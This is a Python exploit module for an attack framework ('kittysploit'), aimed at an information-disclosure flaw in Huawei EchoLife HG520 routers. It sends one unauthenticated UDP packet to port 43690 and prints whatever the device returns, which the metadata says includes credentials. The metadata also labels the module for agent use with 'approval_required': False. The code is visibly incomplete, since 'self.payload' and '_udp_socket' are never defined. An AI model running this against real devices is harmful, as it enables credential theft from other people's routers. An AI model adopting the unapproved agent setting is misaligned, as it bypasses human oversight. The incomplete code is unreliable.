#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Huawei HG520 Information Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Huawei HG520 Information Disclosure',
        'description': 'Module exploits Huawei EchoLife HG520 information disclosure vulnerablity. If the target is vulnerable it is possible to retrieve sensitive information.',
        'author': ['hkm', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/12298/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(43690, "Target port")

    def run(self):
        if self.check():
            print_status("Target returned data")
            print_info(self.content)
        else:
            print_error("Exploit failed - device seems to be not vulnerable")
    def check(self):
        udp_client = _udp_socket(self)
        udp_client.send(self.payload)
        response = udp_client.recv(1024)
        udp_client.close()

        if response:
            self.content = response
            return True  # target is vulnerable

        return False  # target is not vulnerable
